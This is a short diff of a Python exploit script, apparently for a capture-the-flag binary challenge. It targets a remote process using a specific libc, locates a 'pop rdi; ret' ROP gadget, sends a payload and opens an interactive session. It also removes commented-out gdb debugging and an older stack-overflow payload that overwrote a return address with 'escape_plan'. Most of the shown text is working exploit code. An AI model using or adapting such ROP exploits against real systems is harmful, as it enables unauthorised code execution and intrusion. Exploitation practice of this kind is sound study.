@@ -20,9 +20,6 @@ if __name__ == '__main__':
         libc='libc6_2.35-0ubuntu3.1_amd64'
     )
     t = TargetBase(config=remote_config)
-    # _, debugger = gdb.attach(t.process.pid, api=True)
-    # debugger.execute('break execv')
-    # debugger.execute('c')
 
     address = t.file.symbols['main']
     pop_rdi = t.rop.find_gadget(['pop rdi', 'ret']).address + t.base_address_fix
@@ -82,9 +79,4 @@ if __name__ == '__main__':
     t.process.clean(0.3)
     t.process.sendline(payload)
     t.process.interactive()
-    pass
-
-    # address = t.file.symbols['escape_plan']
-    # payload = b'A' * 0x38 + p64(address)
-    # t.process.interactive()
 
